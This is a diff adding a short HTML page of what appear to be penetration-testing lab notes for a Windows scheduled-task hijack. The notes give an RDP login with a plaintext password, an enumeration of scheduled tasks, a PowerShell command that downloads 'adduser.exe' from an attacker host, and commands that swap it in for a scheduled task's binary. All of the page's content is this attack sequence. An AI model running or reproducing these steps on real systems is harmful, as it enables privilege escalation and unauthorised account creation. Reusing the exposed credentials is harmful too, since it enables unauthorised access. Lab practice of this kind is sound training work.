@@ -1,0 +1,14 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Scheduled Task</title>
+</head><body><div style="text-align: left"><span style="font-size: 16pt"><span style="font-family: gg sans">xfreerdp +home-drive /u:alex /p:WelcomeToWinter0121 /v:192.168.192.222</span></span></div>&nbsp; <br/>
+schtasks /query /fo LIST /v<br/>
+<br/>
+&nbsp;iwr -uri http://192.168.45.181/adduser.exe -Outfile BackendCacheCleanup.exe<br/>
+<br/>
+move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak<br/>
+<br/>
+move .\BackendCacheCleanup.exe .\Pictures\<br/>
+</body></html>
